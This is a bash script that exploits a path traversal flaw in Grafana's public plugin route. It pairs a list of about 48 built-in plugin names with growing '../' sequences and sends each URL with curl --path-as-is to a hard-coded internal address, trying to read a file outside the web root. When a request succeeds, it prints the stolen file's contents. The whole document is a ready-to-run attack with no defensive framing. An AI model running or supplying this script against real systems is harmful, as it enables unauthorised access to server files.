#!/bin/bash

# Base URL of the target Grafana instance
base_url="http://192.168.248.193:3000"

# Target file path
target_file="Users/install.txt"

# Maximum traversal depth to try
max_depth=15

# Array of plugin paths to test
plugin_paths=(
    "alertGroups"
    "alertlist"
    "alertmanager"
    "annolist"
    "barchart"
    "bargauge"
    "canvas"
    "cloudwatch"
    "dashboard"
    "dashlist"
    "debug"
    "elasticsearch"
    "gauge"
    "geomap"
    "gettingstarted"
    "grafana-azure-monitor-datasource"
    "grafana"
    "graph"
    "graphite"
    "heatmap"
    "histogram"
    "influxdb"
    "jaeger"
    "live"
    "logs"
    "loki"
    "mixed"
    "mssql"
    "mysql"
    "news"
    "nodeGraph"
    "opentsdb"
    "piechart"
    "pluginlist"
    "postgres"
    "prometheus"
    "stat"
    "state-timeline"
    "status-history"
    "table-old"
    "table"
    "tempo"
    "testdata"
    "text"
    "timeseries"
    "welcome"
    "xychart"
    "zipkin"
)

# Function to build the traversal path
build_traversal_path() {
    local depth=$1
    local path=""
    for ((i=0; i<depth; i++)); do
        path+="../"
    done
    echo "${path}${target_file}"
}

# Iterate through each plugin path and traversal depth
for plugin in "${plugin_paths[@]}"; do
    for ((depth=1; depth<=max_depth; depth++)); do
        traversal_path=$(build_traversal_path $depth)
        url="${base_url}/public/plugins/${plugin}/${traversal_path}"
        echo "Trying path: ${url}"
        response=$(curl --path-as-is -s -o - -w "%{http_code}" "${url}")
        http_code=$(tail -n1 <<< "$response")
        content=$(sed '$ d' <<< "$response")
        
        if [[ $http_code -eq 200 ]]; then
            echo "Success! Found the file at: ${url}"
            echo "File content:"
            echo "$content"
            exit 0
        else
            echo "Failed with HTTP code $http_code"
        fi
    done
done

echo "All attempts failed."
